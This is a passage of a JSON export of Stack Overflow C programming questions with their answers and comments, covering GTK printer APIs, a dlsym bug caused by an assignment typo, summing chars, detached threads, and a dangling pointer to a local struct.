&amp;arr[i]);\n\n    min = *(arr);\n    for (i = 1; i &lt;= 4; i++)\n    {\n        if ( min &lt; *(arr + i) )\n        {\n            printf(\"min for %d is %d\", i, min);\n            min = *(arr + i);\n        }\n    }\n\n    printf(\"%d\\n\", min);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "printing", "gtk3", "gnome"], "answers": [{"comments": [{"owner": {"reputation": 952, "user_id": 3017105, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/bd63c6c3ee7fe49585b81c50100bada4?s=128&d=identicon&r=PG&f=1", "display_name": "iSofia", "link": "https://stackoverflow.com/users/3017105/isofia"}, "edited": false, "score": 0, "creation_date": 1457543698, "post_id": 35898014, "comment_id": 59456924, "body": "Yes; that would get and record the default printer, but not <b><i>set another printer</i></b> as default. How would we set one of the <b><i>other enumerated printers</i></b> as the default printer?"}, {"owner": {"reputation": 1, "user_id": 3849736, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f71c26de71f3ff1f82d7738c26fd614f?s=128&d=identicon&r=PG&f=1", "display_name": "vinicios.barros", "link": "https://stackoverflow.com/users/3849736/vinicios-barros"}, "reply_to_user": {"reputation": 952, "user_id": 3017105, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/bd63c6c3ee7fe49585b81c50100bada4?s=128&d=identicon&r=PG&f=1", "display_name": "iSofia", "link": "https://stackoverflow.com/users/3017105/isofia"}, "edited": false, "score": 0, "creation_date": 1457545230, "post_id": 35898014, "comment_id": 59457991, "body": "sorry if I am wrong but this API doesn&#39;t work this way, you should look for CUPS."}], "tags": [], "owner": {"reputation": 1, "user_id": 3849736, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f71c26de71f3ff1f82d7738c26fd614f?s=128&d=identicon&r=PG&f=1", "display_name": "vinicios.barros", "link": "https://stackoverflow.com/users/3849736/vinicios-barros"}, "is_accepted": false, "score": 0, "last_activity_date": 1457543147, "creation_date": 1457543147, "answer_id": 35898014, "question_id": 35897354, "link": "https://stackoverflow.com/questions/35897354/gtk-setting-default-printer/35898014#35898014", "title": "GTK Setting Default Printer", "body": "<p>I believe that is up to you set in your application the default\nprinter, the API has not the effort to provide the GETs or SETs.\nYour application should be something like this:</p>\n\n<pre><code>static gboolean\nget_default_printer(GtkPrinter *printer, gpointer data)\n{\n        gboolean ret = gtk_printer_is_default(printer);\n        if (ret)\n                set_default_printer = printer;\n\n        return ret;\n}\n</code></pre>\n"}], "owner": {"reputation": 952, "user_id": 3017105, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/bd63c6c3ee7fe49585b81c50100bada4?s=128&d=identicon&r=PG&f=1", "display_name": "iSofia", "link": "https://stackoverflow.com/users/3017105/isofia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 170, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1457543147, "creation_date": 1457541331, "question_id": 35897354, "link": "https://stackoverflow.com/questions/35897354/gtk-setting-default-printer", "title": "GTK Setting Default Printer", "body": "<p>Among the GTK3 print functions is this one, to confirm the current default printer:</p>\n\n<pre><code>gtk_printer_is_default ()\n</code></pre>\n\n<p>However, this is only useful after a call to this enumerating function:</p>\n\n<pre><code>gtk_enumerate_printers ()\n</code></pre>\n\n<p>Are there any functions to <strong><em>GET</em></strong> and <strong><em>SET</em></strong> the default printer directly?</p>\n"}, {"tags": ["c", "dll"], "comments": [{"owner": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1457540016, "post_id": 35896521, "comment_id": 59454301, "body": "nm -uD should only show undefined symbols. Are you sure this is the output from this command? What OS are you on?"}, {"owner": {"reputation": 23, "user_id": 2621619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20588a0fc261155a680e19a2aff00292?s=128&d=identicon&r=PG", "display_name": "Marco Strigl", "link": "https://stackoverflow.com/users/2621619/marco-strigl"}, "reply_to_user": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1457540163, "post_id": 35896521, "comment_id": 59454401, "body": "Sorry. The nm -uD was a typo. The command is only nm -D. OS is SLES 11.3 64 bit"}], "answers": [{"comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1457541468, "post_id": 35897134, "comment_id": 59455328, "body": "And I get criticized for always doing things like <code>if ( NULL == lib ) ...</code>.  If you put the constant first any mistake in the comparison operator will cause a compilation error.  And <code>-Wall</code> is great, too.  If the people who wrote the compiler you&#39;re using to turn your source code into a runnable binary took the extra effort to warn you that they think something in your code is sketchy, it&#39;s a good idea to believe them.  Even to the point of treating any warning as an actual error."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1457541648, "post_id": 35897134, "comment_id": 59455456, "body": "@AndrewHenle There&#39;s an argument to be made regarding using a coding style that exposes certain types of bugs versus coding in a style that&#39;s more readable but using the proper compiler flags to catch bugs.  It can go either way."}, {"owner": {"reputation": 23, "user_id": 2621619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20588a0fc261155a680e19a2aff00292?s=128&d=identicon&r=PG", "display_name": "Marco Strigl", "link": "https://stackoverflow.com/users/2621619/marco-strigl"}, "edited": false, "score": 0, "creation_date": 1457543804, "post_id": 35897134, "comment_id": 59457001, "body": "Thank you so much. I am so blind. I was so focused that the problem must be in the dynamic linking logic that i was not aware of that typo. Normally i always compile with -Wall. I do not know why i missed it this time."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 4, "last_activity_date": 1457540767, "creation_date": 1457540767, "answer_id": 35897134, "question_id": 35896521, "link": "https://stackoverflow.com/questions/35896521/c-dlsym-undefined-symbol/35897134#35897134", "title": "C dlsym undefined symbol", "body": "<p>Here's your problem:</p>\n\n<pre><code>if(lib = NULL) {\n</code></pre>\n\n<p>Instead of <em>comparing</em> <code>lib</code> to NULL, you're <em>assigning</em> NULL to it.  That's why the <code>dlsym</code> call fails.</p>\n\n<p>Change the assignment to a comparison:</p>\n\n<pre><code>if(lib == NULL) {\n</code></pre>\n\n<p>If you compiled your main source with <code>-Wall</code> it would have warned you of this.</p>\n"}], "owner": {"reputation": 23, "user_id": 2621619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20588a0fc261155a680e19a2aff00292?s=128&d=identicon&r=PG", "display_name": "Marco Strigl", "link": "https://stackoverflow.com/users/2621619/marco-strigl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3200, "favorite_count": 0, "accepted_answer_id": 35897134, "answer_count": 1, "score": 1, "last_activity_date": 1559572655, "creation_date": 1457539190, "last_edit_date": 1457540322, "question_id": 35896521, "link": "https://stackoverflow.com/questions/35896521/c-dlsym-undefined-symbol", "title": "C dlsym undefined symbol", "body": "<p>I tried to play around with dynamic linking, but are not able to get a working example. My library code is: </p>\n\n<p><strong>dyn_shl.c:</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;dyn_shl.h&gt;\nvoid hello (void)\n{\n  puts(\"Hello, Im a loaded shared library\");\n}\n</code></pre>\n\n<p>The header file (<strong>dyn_shl.h</strong>)</p>\n\n<pre><code>extern void hello(void);\n</code></pre>\n\n<p>I compile them with:</p>\n\n<pre><code>gcc -fPIC -g -c source/dyn_shl.c -o objects/dyn_shl.o -Iincludes/ -DDEBUG -Wall\ngcc -shared -W1,-soname,libhello.so -o objects/libhello.so objects/dyn_shl.o\n</code></pre>\n\n<p>Now a nm -D objects/libhello.so shows:</p>\n\n<pre><code>0000000000201030 B __bss_start\n                 w __cxa_finalize\n0000000000201030 D _edata\n0000000000201040 B _end\n0000000000000648 T _fini\n                 w __gmon_start__\n00000000000005f4 T hello\n00000000000004d8 T _init\n                 w _Jv_RegisterClasses\n                 U puts\n</code></pre>\n\n<p>There is my hello Symbol at 00000000000005f4. </p>\n\n<p>My main source is in dyn_ratd.c: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;dlfcn.h&gt;\n\nint main (void)\n{\n  void* lib;\n  void (*print_my)(void);\n  char *error;\n\n  lib = dlopen(\"/root/dev/src/wm_rat/objects/libhello.so\",RTLD_NOW);\n  if(lib = NULL) {\n    return printf(\"ERROR: Cannot load library\");\n  }\n  print_my = dlsym(lib, \"hello\");\n        if ((error = dlerror()) != NULL)  {\n            fputs(error, stderr);\n            exit(1);\n        }\n}\n</code></pre>\n\n<p>I build it with </p>\n\n<pre><code>gcc -rdynamic -o bin/dyn_ratd source/dyn_ratd.c -ldl\n</code></pre>\n\n<p>When I am running bin/dyn_ratd i get <strong><em>undefined symbol: hello</em></strong></p>\n\n<p>I don't see where I'm missing the point. Anyone knowing what i am missing? </p>\n"}, {"tags": ["c", "char", "int"], "comments": [{"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 1, "creation_date": 1457539086, "post_id": 35896440, "comment_id": 59453594, "body": "Define <i>&quot;doesn&#39;t work&quot;</i>."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457539186, "post_id": 35896440, "comment_id": 59453679, "body": "<code>printf(&quot;\\n%d&quot;, username[i]);</code>...really?"}, {"owner": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "edited": false, "score": 0, "creation_date": 1457539247, "post_id": 35896440, "comment_id": 59453732, "body": "well i guess that was it xD,"}, {"owner": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "edited": false, "score": 0, "creation_date": 1457539267, "post_id": 35896440, "comment_id": 59453744, "body": "%d was for me to see if they are converted correctly"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1457539546, "post_id": 35896440, "comment_id": 59453968, "body": "What are you trying to do exactly? What do you think it means to &quot;add chars&quot;?"}, {"owner": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "edited": false, "score": 0, "creation_date": 1457539642, "post_id": 35896440, "comment_id": 59454044, "body": "i think it means to add their equivalent int&#39;s?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1457540170, "post_id": 35896440, "comment_id": 59454407, "body": "I really don&#39;t see how this code makes any sense."}, {"owner": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "edited": false, "score": 0, "creation_date": 1457540344, "post_id": 35896440, "comment_id": 59454534, "body": "Well first of all i&#39;m new to C. Second, it&#39;s supposed to be a keygen for a simple crackme program."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "edited": false, "score": 0, "creation_date": 1457539392, "post_id": 35896576, "comment_id": 59453849, "body": "Ik i figured out i just didnt set password to 0. I MEANT to print out as an integer to see if they are converted correclty. thanks though :D"}, {"owner": {"reputation": 55, "user_id": 5495405, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e0d93fc9b66fcc1aabdddd7deef1893a?s=128&d=identicon&r=PG&f=1", "display_name": "y4cO", "link": "https://stackoverflow.com/users/5495405/y4co"}, "reply_to_user": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "edited": false, "score": 0, "creation_date": 1457539561, "post_id": 35896576, "comment_id": 59453981, "body": "oh im sorry i didnt see.. you forgot to initalize the variable before using it. now i saw it"}], "tags": [], "owner": {"reputation": 55, "user_id": 5495405, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e0d93fc9b66fcc1aabdddd7deef1893a?s=128&d=identicon&r=PG&f=1", "display_name": "y4cO", "link": "https://stackoverflow.com/users/5495405/y4co"}, "is_accepted": false, "score": 0, "last_activity_date": 1457539354, "creation_date": 1457539354, "answer_id": 35896576, "question_id": 35896440, "link": "https://stackoverflow.com/questions/35896440/how-to-add-chars-in-c/35896576#35896576", "title": "How to add chars in C?", "body": "<p>first of all learn the basics of C. you want to print out a decimal number with \"%d\". To output chars on console you need to use printf(\"%c\", char_var). if its more than one character you need printf(\"%s\", char[100]) (%s stands for string)</p>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "edited": false, "score": 0, "creation_date": 1457539901, "post_id": 35896716, "comment_id": 59454227, "body": "but what if you do printf(&quot;%d&quot;, (charachter var)); , doesn&#39;t this print the char as an int?"}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1457545407, "post_id": 35896716, "comment_id": 59458111, "body": "Nonsense. <code>&#39;a&#39;</code> and <code>&#39;r&#39;</code> are perfectly valid integers that can be added like any other. How meaningful the result is is another question..."}], "tags": [], "owner": {"reputation": 11, "user_id": 3736631, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8febdaec98dac0e3e95660ac22305f0?s=128&d=identicon&r=PG&f=1", "display_name": "Ayesh Shaminda", "link": "https://stackoverflow.com/users/3736631/ayesh-shaminda"}, "is_accepted": false, "score": 0, "last_activity_date": 1457539705, "creation_date": 1457539705, "answer_id": 35896716, "question_id": 35896440, "link": "https://stackoverflow.com/questions/35896440/how-to-add-chars-in-c/35896716#35896716", "title": "How to add chars in C?", "body": "<p>Don't use 'scanf' to take string inputs. Use 'fgets'. Username array contains characters. You can't display them as integers. You can't sum up the characters. </p>\n"}], "owner": {"reputation": 11, "user_id": 6040401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae85277de309c3478436a1dddd41221b?s=128&d=identicon&r=PG&f=1", "display_name": "rafael Thedoublemaster", "link": "https://stackoverflow.com/users/6040401/rafael-thedoublemaster"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1457539705, "creation_date": 1457539011, "question_id": 35896440, "link": "https://stackoverflow.com/questions/35896440/how-to-add-chars-in-c", "title": "How to add chars in C?", "body": "<p>So this is my code:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main(){\nchar username[100];\nint password, i;\nchar temp;\n\nprintf(\"Enter username: \");\nscanf(\"%s\", username);\nfor(i=0;i &lt; strlen(username);i++){\n    printf(\"\\n%d\", username[i]);\n    temp = username[i];\n    password = password + temp;\n}\nprintf(\"\\n\");\nprintf(\"Your password: %d\", password);\nreturn 0;\n}\n</code></pre>\n\n<p>I know its a bit messy. I've spend HOURS trying to find out why this doesn't work, whereas this does:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main(){\nchar r = 'r';\nchar a = 'a';\nchar f = 'f';\nint i;\ni = r + a + f;\nprintf(\"%d\", i);\nreturn 0;\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "multithreading"], "comments": [{"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1457538816, "post_id": 35896264, "comment_id": 59453380, "body": "When a detached thread returns, its resources will be automatically reclaimed, without needing to call pthread_join."}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 1, "creation_date": 1457538867, "post_id": 35896264, "comment_id": 59453415, "body": "That sounds like a funny book, but it doesn&#39;t exactly square with what I&#39;ve read <a href=\"https://computing.llnl.gov/tutorials/pthreads/\" rel=\"nofollow noreferrer\">here</a> about detached vs join."}], "answers": [{"tags": [], "owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "is_accepted": true, "score": 1, "last_activity_date": 1457538958, "creation_date": 1457538958, "answer_id": 35896417, "question_id": 35896264, "link": "https://stackoverflow.com/questions/35896264/what-means-detach-in-thread-on-the-unix/35896417#35896417", "title": "what means &#39;detach&#39; in thread on the unix?", "body": "<p>Each thread owns resources, which are obtained when you create the thread. The resources need to be released when the thread's function has returned (just like you need to free memory that you allocated dynamically, or close file handles that you opened).</p>\n\n<p>By default, the creator of the thread (= you) retains the ownership of the thread and the responsibility to reclaim its resources. You do this by calling <code>join</code>, which blocks until the thread's function returns and then destroys the thread resources.</p>\n\n<p>Alternatively, you can put the thread into a \"detached\" state, in which case you no longer own it. The thread now \"owns itself\", and as soon as the thread function returns, the thread destroys itself. You cannot join a detached thread, and so you have no way of synchronizing on the thread's completion. (You could argue that that makes it a bad idea to ever detach a thread, since it means you're giving up on understanding the control flow of your program completely.)</p>\n"}], "owner": {"reputation": 521, "user_id": 5737877, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/f08281b24fa35630459e7dd70c388b4c?s=128&d=identicon&r=PG&f=1", "display_name": "A.Cho", "link": "https://stackoverflow.com/users/5737877/a-cho"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 94, "favorite_count": 0, "accepted_answer_id": 35896417, "answer_count": 1, "score": 1, "last_activity_date": 1457538958, "creation_date": 1457538554, "question_id": 35896264, "link": "https://stackoverflow.com/questions/35896264/what-means-detach-in-thread-on-the-unix", "title": "what means &#39;detach&#39; in thread on the unix?", "body": "<p>In the book, there are sentences:</p>\n\n<p><em>By calling <code>pthread_join()</code>, we automatically place the thread with which we're joining in the <strong>detached</strong> state so that its resources can be recovered.\nIf the thread was already in the <strong>detached</strong> state, <code>pthread_join()</code> can fail, returning <code>EINVAL</code>.</em></p>\n\n<p>What means 'detach' in thread??</p>\n"}, {"tags": ["c", "struct"], "comments": [{"owner": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "edited": false, "score": 2, "creation_date": 1457538436, "post_id": 35896129, "comment_id": 59453072, "body": "<a href=\"http://stackoverflow.com/questions/6441218/can-a-local-variables-memory-be-accessed-outside-its-scope\" title=\"can a local variables memory be accessed outside its scope\">stackoverflow.com/questions/6441218/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1457538663, "post_id": 35896209, "comment_id": 59453248, "body": "...and free it before the end of main."}, {"owner": {"reputation": 144, "user_id": 6019461, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ae370463f3a20799276da301afaa48f6?s=128&d=identicon&r=PG&f=1", "display_name": "Industrialactivity", "link": "https://stackoverflow.com/users/6019461/industrialactivity"}, "edited": false, "score": 0, "creation_date": 1457540435, "post_id": 35896209, "comment_id": 59454602, "body": "Surely the value is &quot;saved&quot; from the local scope as it is assigned to something in a higher scope via a pointer? And if this problem is to do with scope, why does the dynamic allocation not fall into the problem of scope?"}, {"owner": {"reputation": 3128, "user_id": 2899520, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d046c85ed155fb3e964d9dd4c43842a?s=128&d=identicon&r=PG&f=1", "display_name": "LearningC", "link": "https://stackoverflow.com/users/2899520/learningc"}, "edited": false, "score": 0, "creation_date": 1457542308, "post_id": 35896209, "comment_id": 59455910, "body": "this local variable is allocated memory in stack so the memory gets deallocated when the function returns. dynamic memory allocates memory in heap and will not deallocate when function returns. you need to read about c memory layout, diifferent storage classes in C and static vs dynamic memory allocation. these concepts will help in better understanding c program"}, {"owner": {"reputation": 144, "user_id": 6019461, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ae370463f3a20799276da301afaa48f6?s=128&d=identicon&r=PG&f=1", "display_name": "Industrialactivity", "link": "https://stackoverflow.com/users/6019461/industrialactivity"}, "edited": false, "score": 0, "creation_date": 1457544009, "post_id": 35896209, "comment_id": 59457161, "body": "Thank you very much, very helpful  :)"}], "tags": [], "owner": {"reputation": 3128, "user_id": 2899520, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d046c85ed155fb3e964d9dd4c43842a?s=128&d=identicon&r=PG&f=1", "display_name": "LearningC", "link": "https://stackoverflow.com/users/2899520/learningc"}, "is_accepted": true, "score": 2, "last_activity_date": 1457538792, "last_edit_date": 1457538792, "creation_date": 1457538406, "answer_id": 35896209, "question_id": 35896129, "link": "https://stackoverflow.com/questions/35896129/intermittent-failure-with-printing-from-a-struct-pointer/35896209#35896209", "title": "Intermittent failure with printing from a struct pointer", "body": "<p>You are returning a local variable from function. this is causing problem.</p>\n\n<p>when the program exists from function <code>information()</code> the variable <code>constants</code> whose address you use in main is already out of scope.<br>\nTo solve this problem you need to create the object in function <code>information()</code> using dynamic allocation. and deallocate this memory dynamically allocated in main. </p>\n"}], "owner": {"reputation": 144, "user_id": 6019461, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ae370463f3a20799276da301afaa48f6?s=128&d=identicon&r=PG&f=1", "display_name": "Industrialactivity", "link": "https://stackoverflow.com/users/6019461/industrialactivity"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "closed_date": 1457538446, "accepted_answer_id": 35896209, "answer_count": 1, "score": 0, "last_activity_date": 1457538792, "creation_date": 1457538159, "question_id": 35896129, "link": "https://stackoverflow.com/questions/35896129/intermittent-failure-with-printing-from-a-struct-pointer", "closed_reason": "Duplicate", "title": "Intermittent failure with printing from a struct pointer", "body": "<p>I managed to condense the code where the problem occurs to this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\ntypedef struct\n{\n    double height;\n    double hello;\n}Variables;     \n\nvoid information(Variables **Constants);\nint main()\n{\n    Variables *Constants=NULL;\n    information(&amp;Constants);        //Assigns values to the structure pointer\n\n    printf(\"Height %lf \\n\",Constants-&gt;height);          //These print correctly only\n    printf(\"hello %lf \\n\",Constants-&gt;hello);           //intermittently \n    return(0);\n}\n\nvoid information(Variables **Constants)     //Assigns values structure pointer\n{\n    Variables *consts,constants;\n\n    constants.height=10;\n    constants.hello=20;\n\n    consts=&amp;constants;\n    *Constants=consts;\n\n    printf(\"Height %lf \\n\",constants.height);          //These always print correctly\n    printf(\"hello %lf \\n\",constants.hello);   \n    return;\n\n}\n</code></pre>\n\n<p>From what i understand, this code should create a structure pointer in main, <code>*Constants</code>. This pointer is then passed into the function using <code>information(&amp;Constants)</code>. In <code>information()</code> another pointer is created and assigned a structure variable. The variable is then filled and the pointer is assigned to <code>*Constants</code>, allowing the entire struct to then be passed back to <code>main()</code>.</p>\n\n<p>If i print the structure inside <code>information()</code>, the values are correct. However if i print the values in <code>main()</code> the values are sometimes correct, or they print random numbers. Any help in understanding this would be appreciated.</p>\n"}, {"tags": ["c++", "c"], "answers": [{"comments": [{"owner": {"reputation": 3682, "user_id": 1400817, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/666a05ea91a0a7e833c3e221a421a47a?s=128&d=identicon&r=PG", "display_name": "Werner Erasmus", "link": "https://stackoverflow.com/users/1400817/werner-erasmus"}, "edited": false, "score": 0, "creation_date": 1457538639, "post_id": 35896175, "comment_id": 59453229, "body": "If mentioned that in this case there is no side effects"}], "tags": [], "owner": {"reputation": 47569, "user_id": 3255455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5993e7ece129141878cd6419d39cc26e?s=128&d=identicon&r=PG&f=1", "display_name": "gnasher729", "link": "https://stackoverflow.com/users/3255455/gnasher729"}, "is_accepted": false, "score": 2, "last_activity_date": 1457538307, "creation_date": 1457538307, "answer_id": 35896175, "question_id": 35896043, "link": "https://stackoverflow.com/questions/35896043/is-it-a-form-of-premature-pessimization-to-check-for-equality-prior-to-assignmen/35896175#35896175", "title": "Is it a form of premature pessimization to check for equality prior to assignment when applied to primitive types?", "body": "<p>As usual, it all depends. First, you should try hard to have only one place in your code where the value is set (for example, a setter, or a property, depending on the language you are using). </p>\n\n<p>If your application is using observers, or if some action needs to be taken if the value changes, then it is often better to check that the value is the same, and only take actions when the value changes. As a result, anyone calling the setter can do so in the knowledge that it is always cheap. That leads to the positive effect that there is only <em>one</em> place in your code where optimisation is needed. </p>\n"}, {"tags": [], "owner": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "is_accepted": false, "score": 1, "last_activity_date": 1457539473, "creation_date": 1457539473, "answer_id": 35896631, "question_id": 35896043, "link": "https://stackoverflow.com/questions/35896043/is-it-a-form-of-premature-pessimization-to-check-for-equality-prior-to-assignmen/35896631#35896631", "title": "Is it a form of premature pessimization to check for equality prior to assignment when applied to primitive types?", "body": "<p>In the case you mention, for a primitive type where no other effect will happen, I say assign always. It is not a premature pessimization. The value will be the same at the end either way and you'll save yourself the load and compare. I think adding the test for equality before the assignment is the premature pessimization.</p>\n"}, {"comments": [{"owner": {"reputation": 3682, "user_id": 1400817, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/666a05ea91a0a7e833c3e221a421a47a?s=128&d=identicon&r=PG", "display_name": "Werner Erasmus", "link": 